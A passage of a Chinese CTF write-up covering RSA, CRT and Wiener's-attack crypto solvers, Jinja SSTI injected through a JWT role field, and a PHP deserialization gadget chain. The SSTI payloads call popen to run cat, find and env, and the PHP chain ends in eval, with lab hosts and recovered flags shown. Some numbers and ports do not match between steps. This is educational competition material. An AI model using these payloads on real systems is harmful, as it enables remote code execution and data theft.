  
  phi_n = (p-1)*(q-1) # φ(n) = (p-1)*(q-1)
  d = inverse(e, phi_n) # 私钥d直接调用逆模函数处理
  
  m = pow(c, d, n) # 解密得到明文m的字节流表达
  m = long_to_bytes(m_long) # 将字节流m转为字符串表示
  ```

有了这些我们直接先去获取一下数据看看

```cmd
C:\Users\probie>nc 127.0.0.1 8055
Here you are:
e = 65537
p = 10229702825240145111887843604531858868036348268208075228677596543403274782950468261319367621696754109292667925482773703576980114582101778771614553485107009
c = 285911444984879813402160967730651402564336080514856466651633595355578816395899338701293683832170473722134734297289522695632585097539001632081124586551440607741027839987335745019553389826165770547412072492027822413699146867940640658566560963785242725135065841775341755824961055247287541169979658319931966466150361269735231648287876886890005626490480076576400363834321808993356848789796936462473664383476926050404353902314516239775467312063847204921456753131515331
```

那还有什么好说的，直接套公式秒了吧

简单写一个解密脚本

```python
from Crypto.Util.number import *

e = 65537
p = 12857660904431014251384085107799862946515894351461817063328260716797856962697987594775513125402687607524763213441881063509055526905064898414423729237910529
c = 1985430241535415352404464307058946283949079078275581304837806700486484964933371835450468818670548602195138446750371125039057624489884519306129851084151812643309727775485673022662995227200120853058996432918597131980940102197925766211866400082105650495064877903550125359858809345170385571464076365163987746052948773358097573627652611190606657115255355404697531398964743130115511197330309571247551867174655442296889393679595408707489223919430902485953517608279409584

d0 = pow(e, -1, p-1)
m0 = pow(c, d0, p)

p2 = p * p
c_mod_p2 = c % p2
m0e_mod_p2 = pow(m0, e, p2)
if m0e_mod_p2 != c_mod_p2:
    t = (c_mod_p2 - m0e_mod_p2) // p
    de = (e * pow(m0, e-1, p)) % p
    de_inv = pow(de, -1, p)
    k = (-t * de_inv) % p
    m1 = (m0 + k * p) % p2
else:
    m1 = m0

p3 = p2 * p
c_mod_p3 = c % p3
m1e_mod_p3 = pow(m1, e, p3)
if m1e_mod_p3 != c_mod_p3:
    t = (c_mod_p3 - m1e_mod_p3) // p2
    de = (e * pow(m1, e-1, p)) % p
    de_inv = pow(de, -1, p)
    k = (-t * de_inv) % p
    m = (m1 + k * p2) % p3
else:
    m = m1

flag = long_to_bytes(m).decode()
print("flag:", flag)
```

运行解密脚本试试

```cmd
C:\Users\probie\Desktop\writeup\Loss N-3>python decrypt.py
flag: XSWCTF{7H3_fiRST_s73P_TO_knocK1N6_on_tH3_dOor_Of_RsA}
```

**得到：**XSWCTF{7H3_fiRST_s73P_TO_knocK1N6_on_tH3_dOor_Of_RsA}



### Sum

#### 解题过程

这个题目介绍很有意思`物不知数」问题：有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？`

下载双击打开，查看加密源码

```python
with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip().encode()


def NumberToBase(number, base):
    if number == 0:
        return [0]
    digits = []
    while number:
        digits.append(int(number % base))
        number //= base
    return digits[::-1]


assert len(flag) <= 45

flag = int.from_bytes(flag, 'big')
while True:
    try:
        raw_input = input("Give me a base: ")
        base = int(raw_input)
    except ValueError:
        print(
            f"Invalid input: '{raw_input}' is not a valid integer. Try again.")
        continue
    except EOFError:
        print("\nConnection closed. Exiting.")
        break

    if base < 2:
        print("Base is too small! ")
        quit()
    if base > 256:
        print("Base is too big! ")
        quit()

    print(f'Here you go: {sum(NumberToBase(flag, base))}')

```

**分析：**

- 题目说到`三三数之剩二，七七数之剩二`很明显是同余问题，想到`CRT中国剩余定理`

先来试试简单获取一下数据线

```cmd
C:\Users\probie>nc 127.0.0.1 8756
Give me a base: 2
Here you go: 180
Give me a base: 200
Here you go: 4577
Give me a base: 250
Here you go: 5734
Give me a base:
```

不够不够，看不出来，直接脚本遍历

```python
from pwn import *

r = remote("127.0.0.1", 5814)

for i in range(2, 256+1):
    r.recvuntil(b"Give me a base: ")
    r.sendline(str(i).encode("utf-8"))
    
    r.recvuntil(b"Here you go: ")
    o = r.recvline().strip().decode("utf-8")
    
    print(f"input: {i} and output: {o}")
```

运行遍历脚本试试

```cmd
C:\Users\probie\Desktop\writeup\Sum>python payload.py
[x] Opening connection to 127.0.0.1 on port 8756
[x] Opening connection to 127.0.0.1 on port 8756: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 8756: Done
input: 2 and output: 180
input: 3 and output: 225
input: 4 and output: 244
input: 5 and output: 297
input: 6 and output: 359
input: 7 and output: 349
input: 8 and output: 423
input: 9 and output: 437
input: 10 and output: 526
...
...
input: 250 and output: 5734
input: 251 and output: 5619
input: 252 and output: 5537
input: 253 and output: 5197
input: 254 and output: 5157
input: 255 and output: 5785
input: 256 and output: 3859
[*] Closed connection to 127.0.0.1 port 8756
```

把数据喂给大模型，让它给我们指点一下思路

然后简单写个解密脚本

```python
import math
from functools import reduce

# 我们刚才遍历出来的数据
pairs = []
with open('out.txt', 'r', encoding='utf-8') as f:
    lines = f.readlines()
    for line in lines:
        if line.startswith('input:') and 'output:' in line:
            input_val = int(line.split('input:')[1].split('and')[0].strip())
            output_val = int(line.split('output:')[1].strip())
            pairs.append((input_val, output_val))

# 中国剩余定理实现
def extended_gcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        g, x, y = extended_gcd(b, a % b)
        return (g, y, x - (a // b) * y)

def crt(remainders, moduli):
    x = 0
    m = 1
    for a, mi in zip(remainders, moduli):
        g, p, q = extended_gcd(m, mi)
        if (a - x) % g != 0:
            return None  # 无解
        lcm = m // g * mi
        tmp = ((a - x) // g * p) % (mi // g)
        x += m * tmp
        m = lcm
    return x

# 准备数据
remainders = []
moduli = []
for base, s in pairs:
    m = base - 1
    if m > 0:
        remainders.append(s % m)
        moduli.append(m)

# 计算flag数值
flag_num = crt(remainders, moduli)

# 转字节
if flag_num:
    # 处理正数和零的情况
    if flag_num == 0:
        flag_bytes = b'\x00'
    else:
        # 计算所需字节数
        byte_length = (flag_num.bit_length() + 7) // 8
        flag_bytes = flag_num.to_bytes(byte_length, byteorder='big')
    print(f'flag: {flag_bytes.decode()}')
else:
    print('go error')
```

运行解密脚本试试

```cmd
C:\Users\probie\Desktop\writeup\Sum>python solve.py
flag: XSWCTF{no_l47tiCES_6Ut_JUsT_cRT_6102b1ee8ebb}
```

**得到：**XSWCTF{no_l47tiCES_6Ut_JUsT_cRT_6102b1ee8ebb}



### Try E

#### 解题过程

下载双击打开，查看加密源码

```python
from Crypto.Util.number import getPrime, bytes_to_long

with open("/home/ctf/flag", "r") as f:
    FLAG = f.read().strip().encode()


def get_huge_RSA():
    p = getPrime(1024)
    q = getPrime(1024)
    N = p * q
    phi = (p - 1) * (q - 1)
    while True:
        d = getPrime(256)
        e = pow(d, -1, phi)
        if e.bit_length() == N.bit_length():
            break
    return N, e


if __name__ == '__main__':
    N, e = get_huge_RSA()
    m = bytes_to_long(FLAG)
    c = pow(m, e, N)

    print(f'N = {hex(N)}')
    print(f'e = {hex(e)}')
    print(f'c = {hex(c)}')

```

**分析：**

- 从`get_huge_RSA`看出这是`RSA`加密
- RSA 密码体制核心：
  1. 选择两个大素数 `p` 和 `q`，计算 `N = p * q`
  2. 计算欧拉函数 `φ(N) = (p-1) * (q-1)`
  3. 选择公钥指数 `e`，满足 `1 < e < φ(N)` 且 `gcd(e, φ(N)) = 1`
  4. 计算私钥 `d`，满足 `d * e ≡ 1 mod φ(N)`
  5. 加密：`c = m^e mod N`
  6. 解密：`m = c^d mod N`

有了这些以后

我们先去获取一下数据看看

```cmd
C:\Users\probie>nc 127.0.0.1 2104
N = 0x5b23eb8d1d74a3288840dee82e3a5b58e8c67eb21e332f649986702945971c411d4d823166c598384f95d80e45f1ed9c15b6bc74db83b1998456e9f16daddbb1455625dde994485acd225f37bc5545004bfe9331a3a0c3971ba9b56250aa335058057342fed3455dec2621a24c18db9dc1af08da2f1f3510cc5cba1c3ae3f18ee88160fdb8ec9f6ea88c8d74b5bc7e3289cfb7ea9c8f1c186ccbb83f1a504e399d8e99ca2b6da9cfe000eaa8e5615dcd48050a268c23dcbc8fa7334c540a371272cbb2f876bd67971984398fb29064f6e88195b91d0d5ca902887e3144761fb27d228ec174470b44a7fa04ed7b33b6a1d22e46d11f92b725b2d38e69e589cfd9
e = 0x463e5117c28bfd7da4f2cd58eb737a8e8057244084f67de1a9dbadd9a45121502d51f5116840d6401ee118a2bd48efa116443ff98b8fa96aaf4f6beb2547593b64d90685952bfb4d71139b4ac45c58274991d384df3b21761918d3c1a0c0060f7529bffe1937c5a7c70751af082f99eaa63a218a52938bd69ca24d12b39979cc76ec42cacdbcc935f35fbeca0267092b5f612468251537ccf8309b97e7b3ca1afefe8b966872611a75fb3108d51daadad7eba155791d5429cac13e23db83f98950833d9739d47670abaac7a4db863ce6ec209d972000eb9a4d310e7b6addff76de853660a949df762d0cdb2c3d8fa86e059d92dc80fcfc7fbad77bbee0b94c3f
c = 0x38e3b72e9788c338272f7c5a6a8a18250e4a279606236f888e3f55ca23ed4ffbb49cc19df539d72442294158dd9d5a3b51db4a195b522fbc27481e2b89665eb459c209191723e11d2fabfe47013a2ec7b4912500e4e57601e79fb6d68dc18696ea6b042a0717d9cc19d14ec0684296f02e283c4a620c8749d9931c32b3014ccf177278dea7b2f14c96156a98703b87c65f299bbd34406d5db9aeb9ca40a981124356412cd0ab136212b5c4e7f67072eb510fcd466c7bd82b0413ca09cf54c660d96e06476a835912b5530efe98769294621a6265a59621f5d0b98a91af46a942415fa9808ea4419b7a170d8a3a236cb92d52546c61e0bb8eae9e09e06242cda5
```

这么大的e有多大？

- 模数 `N`：2048 位
- 公钥 `e`：2048 位
- 密文 `c`：2047 位

**分析：**

- 我们第一时间想到分解N，但是太大了，算力吃不消

- 随机生成256位私钥d，也太慢了，不行

- 遍历小值t或k反推φ(N)或e，试了一下不知道为什么好像出不来

- 搜一下发现有种叫`Wiener's 攻击`的东西

  Wiener's 攻击是一种针对 RSA 私钥 `d` 较小情况的高效攻击方法。当 `d` 满足以下条件时：

  ```
  d < N^(1/4) / 3
  ```

  可以通过连分数展开找到 `d`

  ```
  e/N = a0 + 1/(a1 + 1/(a2 + 1/(...)))
  ```

  计算收敛项

  - 收敛项是连分数展开的截断形式，它们是 e/N 的有理逼近。每个收敛项都可以表示为分数 h_i/k_i

  验证收敛项

  对于每个收敛项 `h_i/k_i`，检查 `k_i` 是否可能是私钥 `d`：

  - 计算 `φ_candidate = (e * k_i - 1) / h_i`
  - 验证 `φ_candidate` 是否正确：计算 `p + q = N - φ_candidate + 1`，检查判别式 `D = (p+q)^2 - 4N` 是否为完全平方数
  - 如果 `D` 是完全平方数，计算 `p = (p+q + sqrt(D))/2` 和 `q = (p+q - sqrt(D))/2`，验证 `p * q == N`

这里有点复杂了，我数学有点差，丢给大模型来帮我做

写一个解密脚本

```python
from Crypto.Util.number import long_to_bytes, inverse
import math
import time

# 给定的十六进制参数
n_hex = '0xc3f702b95986dca8044f5e1b60f17c887af9992eb5647711a21309f47ba3bd6d86215b67249df7955bf055bfa97947e2b3448f4fee4ed86ade58ab49298c26415764e4f49706e37e1804e53937850a87e4a1a912ab42426f0c8da54e992d23cb05e2e7a8df9883eab0de4446cc58135933517fc92f171b93db125aaaa04bf7cd514a04f1baa56b25286a2682738511e31a8085a3f9cd05d27e0eca98d1f9afd4d8d53e3629c8b5ff95eb772926e30d8aea1b8bc5e5a183ae1a8935b689413fc42f44c4cadfd6b4ea0e7c9b27d721347c558198acf3c469322bd81e5a594a270f0614e358f043cb78a4f69b60fb1ab81e5b023be7bde63a6410b7848820b39b0b'
e_hex = '0x9c2dcc32c6a80415c536adc135b46a42df2dff0885b5b321ee635f152596e7b56c5deabdf127a1fea62d2f0a42927cbf3dd54e596465e00f2a6d6b9fa544df8ec9e4386f70f61682cf6c5469d2c898cde86ef837d355a9e73b9a55aa75597b732ada11da4b0ee43aef1a65ff031d9e8eced72a822dd6ee74eb7fb8c4ce8673b3a80d1e998a25987c5df9326bbdb9514897c5af22c2f47a3deadbb44b358d93be73e7f95c142d14ae0dbdeacfd35d2601dcea5c7ed8e1a4c3eefae2d79747f1ec38c14bc2754c160b5965403b0ac3c78a9522341934923169a983ddfd6a2c95aed5bca5c2751811a36ce1660b1d23a799d860f8648a543dde6d3f70d7faae5b69'
c_hex = '0x5ecdecd522420510896249ea217cd3380ab50a7ceb740908dc557bc8bbf76156bb6063bd96b4be283f93d00e1cebd18a1d6cd3588fcbc2f971f0093f1ffc1fffb1ce83475546cc2766b6275dff0cfe330ae0423a87c60fc70372374a0c7b82a0e591e79249ca5393bf1bbea504cc1f3c41899e85c850a4cbaa6ad3e0d8bed51f644ed8fe080e397f6b0ae676d1c7a2d3acead8f3d4184d41ba9248b0b392f11362948b0b88d552cc172c561211dabe740fe7ab4da2bb89c4571dcf3625436cbe535a701e9b6a16d368a68d4a9a6bdf0aeae027145a2bd123d3f65617c580bdc3d460cfc3ed6050bb31f6dd7ed654358ca2d9ab89ac89054aae86addffe77c7d4'

# 转换为整数
n = int(n_hex, 16)
e = int(e_hex, 16)
c = int(c_hex, 16)

# 计算连分数展开
def continued_fractions(numerator, denominator):
    cf = []
    while denominator != 0:
        quotient = numerator // denominator
        cf.append(quotient)
        numerator, denominator = denominator, numerator % denominator
    return cf

# 计算收敛项
def convergents(cf):
    convergents_list = []
    # 初始值
    h = [0, 1]
    k = [1, 0]
    
    for a in cf:
        h_next = a * h[-1] + h[-2]
        k_next = a * k[-1] + k[-2]
        h.append(h_next)
        k.append(k_next)
        convergents_list.append((h_next, k_next))
    
    return convergents_list

# 执行攻击
start_time = time.time()
cfe = continued_fractions(e, n)
conv = convergents(cfe)

print(f"计算了 {len(conv)} 个收敛项")

for i, (h, k) in enumerate(conv):
    # 跳过无效值
    if h == 0 or k == 0 or k < 0:
        continue
    
    # 计算 φ_candidate
    numerator = e * k - 1
    if numerator <= 0 or numerator % h != 0:
        continue
    
    phi_candidate = numerator // h
    
    # 计算 p + q
    p_plus_q = n - phi_candidate + 1
    
    # 计算判别式 D = (p+q)^2 - 4n
    D = p_plus_q ** 2 - 4 * n
    if D < 0:
        continue
    
    # 检查 D 是否为完全平方数
    sqrt_D = math.isqrt(D)
    if sqrt_D * sqrt_D != D:
        continue
    
    # 计算 p 和 q
    p = (p_plus_q + sqrt_D) // 2
    q = (p_plus_q - sqrt_D) // 2
    
    # 验证 p * q == n
    if p * q == n:
        d = k
        print(f"\n找到正确的 d!")
        print(f"d: {hex(d)}")
        print(f"d 位长度: {d.bit_length()}")
        print(f"p: {hex(p)}")
        print(f"q: {hex(q)}")
        
        # 解密 flag
        m = pow(c, d, n)
        flag = long_to_bytes(m)
        print(f"\n解密得到的 flag: {flag.decode('utf-8')}")
        print(f"总耗时: {time.time() - start_time:.2f} 秒")
        exit()

print(f"\n攻击失败，未找到 d")
print(f"总耗时: {time.time() - start_time:.2f} 秒")
```

运行解密脚本

```cmd
C:\Users\probie\Desktop\writeup\Everything_is_big>python solve.py
N bit length: 2048
e bit length: 2048
c bit length: 2047
e: 0x9c2dcc32c6a80415c536adc135b46a42df2dff0885b5b321ee635f152596e7b56c5deabdf127a1fea62d2f0a42927cbf3dd54e596465e00f2a6d6b9fa544df8ec9e4386f70f61682cf6c5469d2c898cde86ef837d355a9e73b9a55aa75597b732ada11da4b0ee43aef1a65ff031d9e8eced72a822dd6ee74eb7fb8c4ce8673b3a80d1e998a25987c5df9326bbdb9514897c5af22c2f47a3deadbb44b358d93be73e7f95c142d14ae0dbdeacfd35d2601dcea5c7ed8e1a4c3eefae2d79747f1ec38c14bc2754c160b5965403b0ac3c78a9522341934923169a983ddfd6a2c95aed5bca5c2751811a36ce1660b1d23a799d860f8648a543dde6d3f70d7faae5b69
n: 0xc3f702b95986dca8044f5e1b60f17c887af9992eb5647711a21309f47ba3bd6d86215b67249df7955bf055bfa97947e2b3448f4fee4ed86ade58ab49298c26415764e4f49706e37e1804e53937850a87e4a1a912ab42426f0c8da54e992d23cb05e2e7a8df9883eab0de4446cc58135933517fc92f171b93db125aaaa04bf7cd514a04f1baa56b25286a2682738511e31a8085a3f9cd05d27e0eca98d1f9afd4d8d53e3629c8b5ff95eb772926e30d8aea1b8bc5e5a183ae1a8935b689413fc42f44c4cadfd6b4ea0e7c9b27d721347c558198acf3c469322bd81e5a594a270f0614e358f043cb78a4f69b60fb1ab81e5b023be7bde63a6410b7848820b39b0b

Starting Wiener's attack...
Computed 911 convergents.

Found the correct d!
d: 0xa8a663093e026ebf4952a116574c0f4655d37ce336ed8b9fba80ff1ec48445c1
d bit length: 256
p: 0xeb35dd8e50049968d08dcfcb5a4695c40c4401253914bae5fcddee53b339674a323f592224f3b80b2f343b638629cdd1a2617e934ed415b994aecf6469a84001a1a9e216b5f7d27f0f50464a95a3601effc8366fcb5f4ef949daa758fb5104cf15c651e3165dbe7b2731c5d40f40db1f747ac66ae8febf13ffac0dd08d7841dd
q: 0xd54921c3b69b6ff3a065608a1930d2b525d15faeab29f69afb3f0f2891092c4902a5cdfc8db8b945e1d734472f676a8f4dab7addc6e9f61cc5a365e8bb2d27dcbc17d8d4565dc6336707cc4c487c9dcdc2e988c3fc41e559ffdb567909a636bc722ce068b4e496477c1cfa5787a67792eb4c5b19364e86eb3918cc04ec7f2607
p*q: 0xc3f702b95986dca8044f5e1b60f17c887af9992eb5647711a21309f47ba3bd6d86215b67249df7955bf055bfa97947e2b3448f4fee4ed86ade58ab49298c26415764e4f49706e37e1804e53937850a87e4a1a912ab42426f0c8da54e992d23cb05e2e7a8df9883eab0de4446cc58135933517fc92f171b93db125aaaa04bf7cd514a04f1baa56b25286a2682738511e31a8085a3f9cd05d27e0eca98d1f9afd4d8d53e3629c8b5ff95eb772926e30d8aea1b8bc5e5a183ae1a8935b689413fc42f44c4cadfd6b4ea0e7c9b27d721347c558198acf3c469322bd81e5a594a270f0614e358f043cb78a4f69b60fb1ab81e5b023be7bde63a6410b7848820b39b0b
n: 0xc3f702b95986dca8044f5e1b60f17c887af9992eb5647711a21309f47ba3bd6d86215b67249df7955bf055bfa97947e2b3448f4fee4ed86ade58ab49298c26415764e4f49706e37e1804e53937850a87e4a1a912ab42426f0c8da54e992d23cb05e2e7a8df9883eab0de4446cc58135933517fc92f171b93db125aaaa04bf7cd514a04f1baa56b25286a2682738511e31a8085a3f9cd05d27e0eca98d1f9afd4d8d53e3629c8b5ff95eb772926e30d8aea1b8bc5e5a183ae1a8935b689413fc42f44c4cadfd6b4ea0e7c9b27d721347c558198acf3c469322bd81e5a594a270f0614e358f043cb78a4f69b60fb1ab81e5b023be7bde63a6410b7848820b39b0b
Flag: XSWCTF{YoU_kNOW_CoNtlNu3D_1R4cTION!}
Total time: 0.00 seconds
```

**得到：**XSWCTF{YoU_kNOW_CoNtlNu3D_1R4cTION!}



## Web

### easy_ssti

#### 解题过程

启动容器打开网页

题目提示要我们找找`ssti`注入点

看到控制台，没东西

看到源代码，没东西

看到网络，有一个请求，没有负载，响应没东西，有一个标头看看

```
请求 URL
http://127.0.0.1:11879/
请求方法
GET
状态代码
200 OK
远程地址
127.0.0.1:11879
引用站点策略
strict-origin-when-cross-origin
connection
close
content-length
20
content-type
text/html; charset=utf-8
date
Mon, 17 Nov 2025 05:04:57 GMT
server
Werkzeug/3.1.3 Python/3.14.0
accept
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
accept-encoding
gzip, deflate, br, zstd
accept-language
zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
cache-control
max-age=0
connection
keep-alive
cookie
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.MtB5KWRumAdoabqz0bzNeaR75Ut2f5HLFfHJTReypWA
dnt
1
host
127.0.0.1:11879
sec-ch-ua
"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"
sec-ch-ua-mobile
?0
sec-ch-ua-platform
"Windows"
sec-fetch-dest
document
sec-fetch-mode
navigate
sec-fetch-site
none
sec-fetch-user
?1
upgrade-insecure-requests
1
user-agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0
```

看到一条很可疑的东西

```
cookie
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.MtB5KWRumAdoabqz0bzNeaR75Ut2f5HLFfHJTReypWA
```

看到这种三段式`头.负载.签名`的东西猜测是`JWT`

解码一下这条信息看看

```
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "role": "user"
}

a-string-secret-at-least-256-bits-long
```

此时我们注意到这个`user`和网页显示的user是一致的

我们测试一下改成别的

我这里用的是谷歌浏览器的一个叫`hackbar`拓展插件发送的POST请求

```
{
  "role": "probie"
}
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.gNyGK1nskEAM7gSwrCJqco8biS7CCcueSTBaguzrKjQ
```

此时网页显示`Hello probie!`

说明这就是这道题的注入点了

我们直接构造一个简单的payload测试一下注入

```
{
  "role": "{{1+1}}"
}
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoie3sxKzF9fSJ9.hLLAWqkkc0a81Lrj_9jQpDm7PykedrJ_2FmpWOc17ig
```

看到网页显示`Hello 2!`

接着查找一下它的函数数组

```
{
  "role": "{{().__class__.__base__.__subclasses__()}}"
}
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoie3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKX19In0.F8gX8Nf8T5K75cfyVT7TNJhivBYfpM_4feugcf-QfB8
```

看到网页反馈

```
Hello [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class
```

我们找一下`<class 'os._wrap_close'>`发现它在第`166`个

我们直接来构造payload

```
{
  "role": "{{().__class__.__base__.__subclasses__()[166].__init__.__globals__.popen('cat /flag').read()}}"
}
```

发现没有，可能是作者粗心在当前目录下

我们再直接来构造payload

```
{
  "role": "{{().__class__.__base__.__subclasses__()[166].__init__.__globals__.popen('cat ./flag').read()}}"
}
```

还是没有，我们可能需要find一下了

我们再再直接来构造payload

```
{
  "role": "{{().__class__.__base__.__subclasses__()[166].__init__.__globals__.popen('find / -name \"*flag*\" 2>null').read()}}"
}
```

还还是没有，想到会不会是在环境遍历里

我们再再再直接来构造并发送我们的payload试试

```
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "role": "{{().__class__.__base__.__subclasses__()[166].__init__.__globals__.popen('env 2>/dev/null').read()}}"
}

a-string-secret-at-least-256-bits-long
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoie3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVsxNjZdLl9faW5pdF9fLl9fZ2xvYmFsc19fLnBvcGVuKCdlbnYgMj4vZGV2L251bGwnKS5yZWFkKCl9fSJ9.PmvZc-DbgIlnRq2hpeWxvmT9k_M9ia6hu9Gj9_6dd6k
```

```
"Cookie": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.MtB5KWRumAdoabqz0bzNeaR75Ut2f5HLFfHJTReypWA"
```

得到网页的反馈信息

```
Hello KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.43.0.1:443 HOSTNAME=easy-ssti-43aed0821e404246 SHLVL=3 HOME=/home/ctf OLDPWD=/ FLASK_RUN_FROM_CLI=true PYTHON_SHA256=2299dae542d395ce3883aca00d3c910307cd68e0b2f7336098c8e7b7eee9f3e9 WERKZEUG_SERVER_FD=3 KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 GZCTF_FLAG=XSWCTF{5ST1_In_jWT_963a63bbcbe6} KUBERNETES_PORT_443_TCP_PROTO=tcp PYTHON_VERSION=3.14.0 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443 KUBERNETES_SERVICE_HOST=10.43.0.1 PWD=/home/ctf/app GZCTF_TEAM_ID=36 !
```

我们直接`Ctrl+F`搜索`flag`找到

```
GZCTF_FLAG=XSWCTF{5ST1_In_jWT_963a63bbcbe6}
```

**得到：**XSWCTF{5ST1_In_jWT_963a63bbcbe6}



### hello_ser

#### 解题过程

直接开启容器连接网页，查看源码

```php
<?php
highlight_file('index.php');
class A {
    public $a1;
    
    // 当对象销毁时触发
    public function __destruct() {
        echo "[*] __destruct success<br>";
        $this->a1->call_B($this->a2);
    }
}

class B {
    public $b1;
    
    // 调用不存在的方法时触发
    public function __call($method, $args) {
        echo "[*] __call success<br>";
        $level = $this->b1->get_C;
        return true;
    }
}

class C {
    private $c1;
    
    // 读取不存在的属性时触发
    public function __get($name) {
        echo "[*] __get success<br>";
        $this->c1->set_D = $name;
    }
}

class D {
    public $invoke_E;
    
    // 设置不存在的属性时触发
    public function __set($key, $value) {
        echo "[*] __set success<br>";
        return ($this->invoke_E)();
    }
}

class E {
    public $toString_F;
    
    // 对象被当作函数调用时触发
    public function __invoke() {
        echo "[*] __invoke success<br>";
        echo $this->toString_F;
    }
}

class F {
    public $cmd;
    
    // 对象被当作字符串使用时触发
    public function __toString() {
        echo "[*] __toString success, now you can get flag!!!<br>";
        return eval($this->cmd);
    }
}

$ser = $_POST['unser'] ?? '';
@unserialize($ser);

?>
```

**分析：**

- 这是一道php`魔术链`的题目
- 先来看看成分
  1. **`__destruct` (类A)** - 析构函数，当对象被销毁时调用，执行`($this->a1)()`
  2. **`__call` (类B)** - 当调用不存在的方法时调用，返回`$this->b1`
  3. **`__get` (类C)** - 当访问不存在的属性时调用，返回`$this->c1`
  4. **`__set` (类D)** - 当设置属性值时调用，执行`($this->invoke_E)()`
  5. **`__invoke` (类E)** - 当对象被当作函数调用时调用，返回`$this->toString_F`
  6. **`__toString` (类F)** - 当对象被当作字符串时调用，执行`eval($this->cmd)`

知道了这些我们就可以来尝试构造`对象链`了

```php
<?php

class A { public $a1; public $a2; }
class B { public $b1; }
class C { private $c1; public function __construct($c1) { $this->c1 = $c1; } }
class D { public $invoke_E; }
class E { public $toString_F; }
class F { public $cmd; public function __construct($cmd) { $this->cmd = $cmd; } }

$f = new F('return file_get_contents("/flag");');
$e = new E(); $e->toString_F = $f;
$d = new D(); $d->invoke_E = $e;
$c = new C($d);
$b = new B(); $b->b1 = $c;
$a = new A(); $a->a1 = $b; $a->a2 = "";

// 生成序列化payload
$payload = serialize($a);
?>
```

得到我们的序列化数据

```
"O:1:\"A\":2:{s:2:\"a1\";O:1:\"B\":1:{s:2:\"b1\";O:1:\"C\":1:{s:4:\"\00C\00c1\";O:1:\"D\":1:{s:8:\"invoke_E\";O:1:\"E\":1:{s:11:\"toString_F\";O:1:\"F\":1:{s:3:\"cmd\";s:28:\"return file_get_contents(\0022/flag\0022);\";}}}}}s:2:\"a2\";s:0:\"\";}"
```

我们这里尝尝先，猎奇一小下，用powershell来发送我们的payload试试

```php
$payload = "O:1:\"A\":2:{s:2:\"a1\";O:1:\"B\":1:{s:2:\"b1\";O:1:\"C\":1:{s:4:\"\00C\00c1\";O:1:\"D\":1:{s:8:\"invoke_E\";O:1:\"E\":1:{s:11:\"toString_F\";O:1:\"F\":1:{s:3:\"cmd\";s:28:\"return file_get_contents(\0022/flag\0022);\";}}}}}s:2:\"a2\";s:0:\"\";}"
$response = Invoke-WebRequest -Uri http://127.0.0.1:1916/ -Method POST -Body @{"unser" = $payload} -ContentType "application/x-www-form-urlencoded"
$response.Content
```

最终也是成功读取到`/flag`的内容了

**得到：**XSWCTF{ada0985e-2336-4b48-9286-d711403204c7}



### PyChecker **(尝试)**

#### 尝试过程

这是一道`eval`执行任意代码利用的题目

问题就出在不知道怎么回显

**尝试**

- raise自定义报错

  我在代码中直接`raise error("error")`发现能编译通过，不知道为什么走不通

- 修改flask视图

  找了好一阵，没找到flask的视图名称，走不通

- 把数据放到响应里

  好像被过滤了吗，反正是走不通

- 外带到我的服务器上

  还没尝试过，我觉得可以请求我的`ngrok`或者`webhook`来获取数据

  不过我觉得这种容器应该，应该是在沙箱里的，应该是不能出站的吧
  
- 时间盲注

  这个我也还没有尝试过，不过想到实现起来还是比较麻烦的

  而且耗时耗力，并且各种因素产生的误差还不是一般的大，所以就放弃了



## OSINT

### 盒武器 **(尝试)**

#### 尝试过程

看到这种自然景观觉得是**国内的西北地区**

然后丢给大模型，告诉我是在`贺兰山`

然后我放大图片，隐约看到`内蒙古`三个字

猜测这里应该是`贺兰山左翼`，宁夏于内蒙古的交界处

然后我用`百度`的经纬度卫星全景地图找呀找，找了很久都没有找到这个点

因为荒郊野岭的在地图上没有什么层次，找这么小一个点就更是难找了

然后干脆以周围著名景点森林公园作为基点，尝试几个坐标

然后就是`BD09`转`GCJ02`坐标系大致得到`38.74,106.02`

不正确，然后放弃了



# 后记

## 账号

### 账号名称

probie

### 账号密码

$Xxxxxxxx



## 队伍

### 队伍名称

菜鸟的个人队

### 队伍成员

probie



## 赠言

好好吃饭，认真睡觉。感谢相遇，铭记学习。